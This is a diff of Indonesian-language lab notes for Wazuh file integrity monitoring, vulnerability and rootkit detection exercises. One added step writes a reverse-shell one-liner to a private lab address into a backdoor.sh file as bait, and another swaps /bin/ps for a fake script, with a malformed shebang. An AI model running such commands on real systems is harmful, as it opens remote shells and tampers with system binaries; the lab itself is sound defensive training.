@@ -16,7 +16,14 @@ Lab 1 - Set Up Comprehensive File Integrity Monitoring (FIM) on a Wazuh Agent
     <ignore>/tmp/*</ignore>
 </syscheck>
 
-2. selesai
+2. tambahkan sebuah file dengan cara touch 
+   - echo "sh -i >& /dev/tcp/10.10.10.10/9001 0>&1" > backdoor.sh 
+   - chmod +x backdoor.sh
+
+3. check pada dashboard, file integrity monitoring
+  - di endpoint security --> file integirty monitoring
+
+4. selesai
 
 
 ==============================================================================================
@@ -26,7 +33,9 @@ Lab 1 - Set Up Comprehensive File Integrity Monitoring (FIM) on a Wazuh Agent
 Lab 2 - Agent Inventory Collection and Vulnerability Detection
 ==============================================================================================
 
-1. edit ossec.conf ( agent ubuntu ) tambahkan configurasi dibawah ini : 
+1. edit ossec.conf ( agent windows ) tambahkan configurasi dibawah ini : 
+  - masuk ke manage agent, klik menu view --> view config
+  - tambahkan configurasi dibawah ini didalam configurasi file integrity monitoring
 
   <vulnerability-detector>
     <enabled>yes</enabled>
@@ -37,12 +46,13 @@ Lab 2 - Agent Inventory Collection and Vulnerability Detection
   </vulnerability-detector>
 
 
-2. Instal applikasi dengan versi lama 
-   - sudo apt install openssl=1.1.1f-1ubuntu2 -y
+2. masuk ke website https://ninite.com, install apapun aplikasinya 
 
 3. verifikasi 
    - tail -f /var/ossec/logs/alerts/alerts.json
 
+4. verifikasi langsung lewat dashboard file integrity monitoring atau discover
+5. selesai
 
 ==============================================================================================
 ==============================================================================================
@@ -57,35 +67,32 @@ Lab 3 - FIM Detecting Malware
 <rootcheck>
   <enabled>yes</enabled>
   <rootkit_files>yes</rootkit_files> <!-- Scan for rootkit IoCs -->
-  <rootkit_trojans>yes</rootkit_trojans> <!-- Detect known trojans →
-    <check_rk>yes</check_rk> <!-- Enable kernel check →
+  <rootkit_trojans>yes</rootkit_trojans> <!-- Detect known trojans -->
+    <check_rk>yes</check_rk> <!-- Enable kernel check -->
   <frequency>3600</frequency> <!-- Scan every hour -->
 </rootcheck>
 
 <syscheck>
-  <directories check_all="yes">/bin</directories>
-  <directories check_all="yes">/sbin</directories>
-  <directories check_all="yes">/etc</directories>
-  <directories check_all="yes">/usr/bin</directories>
-  <directories check_all="yes">/tmp</directories> <!-- Rootkit hiding place -->
+  <directories realtime="yes" report_changes="yes" check_all="yes">/bin</directories>
+  <directories realtime="yes" report_changes="yes" check_all="yes">/sbin</directories>
+  <directories realtime="yes" report_changes="yes" check_all="yes">/etc</directories>
+  <directories realtime="yes" report_changes="yes" check_all="yes">/usr/bin</directories>
+  <directories realtime="yes" report_changes="yes" check_all="yes">/tmp</directories> <!-- Rootkit hiding place -->
   <alert_new_files>yes</alert_new_files>
   <frequency>3600</frequency>
 </syscheck>
 
 2. Buatkan file yang diangap rootkit dengan mode user 
-  - touch /etc/.hidden_malware
+  - touch /tmp/.hidden_malware
   - sudo mv /bin/ps /bin/ps.bak
-  - echo "#!/bin/bash" | sudo tee /bin/ps > /dev/null
+  - echo "!#/bin/python3" | sudo tee /bin/ps > /dev/null
   - sudo chmod +x /bin/ps
 
 3. Verifikasi 
   - tail -f /var/ossec/logs/alerts/alerts.json
 
-4. Lakukan dengan rootkit mode kernel 
-  - sudo apt-get install rkhunter
-  - sudo rkhunter --check --skip-keypress
-
-5. Selesai
+5. check kembali di dashboard file integrity monitoring 
+6. Selesai
 
 ==============================================================================================
 ==============================================================================================
